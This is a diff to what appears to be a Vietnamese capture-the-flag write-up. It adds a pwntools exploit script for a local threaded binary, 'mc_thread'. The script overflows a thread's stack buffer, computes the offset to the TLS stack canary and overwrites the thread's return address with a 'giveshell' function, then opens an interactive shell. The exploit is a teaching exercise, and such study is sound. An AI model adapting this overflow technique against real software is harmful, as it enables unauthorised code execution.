@@ -68,7 +68,70 @@ int main() {
 }
 ```
 * main thread: main()
-* new thread: thread_routine(), read_bytes() 
+* new thread: thread_routine(), read_bytes()
+
+script.py:
+````python
+from pwn import *
+
+libc = ELF("./libc.so.6", checksec=False)
+
+context.binary = exe = ELF("./mc_thread", checksec=False)
+context.log_level = "debug"
+
+p = process(exe.path)
+
+def GDB():
+	gdb.attach(p, gdbscript='''
+		br *main
+		br *thread_routine
+		br *read_bytes
+		br *read_bytes + 57
+		br *thread_routine + 134
+		''')
+GDB()
+
+giveshell = p64(0x401256)
+tls_canary = 0x7ffff7bff6c0 + 0x28 # 0x7ffff7bff6e8
+buffer = 0x7ffff7bfedc0
+offset = tls_canary - buffer # 0x928 : 2344
+thread_rip_offset = 0x7ffff7bfeed8 - 0x7ffff7bfedc0 # 0x118: 280
+thread_rip_offset /=  0x08
+thread_rip_offset = int(thread_rip_offset)
+
+size = b"2345"  # offset / 0x08
+p.sendlineafter(b"Size: ", size)
+
+# payload = b"A" * 8
+
+p.recvuntil(b"Data: ")
+for i in range(int(size)):
+	if i == thread_rip_offset:
+		p.send(giveshell) 
+	else:
+		p.send(b"A" * 8)
+p.send(b"A" * 8)
+
+print(f"thread_rip_offset: {thread_rip_offset}")
+# for i in range(thread_rip_offset):
+# 	if i == thread_rip_offset-0x16:
+# 		p.send(b"\x00")
+# 	elif i == thread_rip_offset:
+# 		p.send(giveshell)
+# 	else:
+# 		p.send(b"A" * 8)
+
+# for i in range(36):
+# 	if i == 35:
+# 		p.send(giveshell)
+# 	elif i == 33:
+# 		p.send(b"\x00")
+# 	else:
+# 		p.send(b"A" * 8)
+
+
+p.interactive()
+````
 ___ 
 **Tài liệu:**
 
